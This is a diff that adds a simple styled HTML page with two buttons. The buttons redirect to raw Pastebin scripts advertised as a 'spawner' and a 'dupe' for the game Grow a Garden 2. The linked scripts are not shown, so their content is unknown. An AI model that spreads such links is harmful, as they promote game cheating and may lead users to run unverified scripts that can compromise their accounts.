@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Choose an Option</title>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #4facfe, #00f2fe);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 25px;
+        }
+
+        button {
+            width: 250px;
+            padding: 15px;
+            margin: 10px;
+            font-size: 18px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .option1 {
+            background: #28a745;
+            color: white;
+        }
+
+        .option1:hover {
+            background: #218838;
+        }
+
+        .option2 {
+            background: #007bff;
+            color: white;
+        }
+
+        .option2:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Choose an Option</h1>
+
+    <button class="option1"
+        onclick="window.location.href='https://pastebin.com/raw/Vv5nTym8'">
+        GROW A GARDEN 2 SPAWNER
+    </button>
+
+    <br>
+
+    <button class="option2"
+        onclick="window.location.href='https://pastebin.com/raw/6BB2pVi5'">
+        GROW A GARDEN 2 DUPE
+    </button>
+</div>
+
+</body>
+</html>
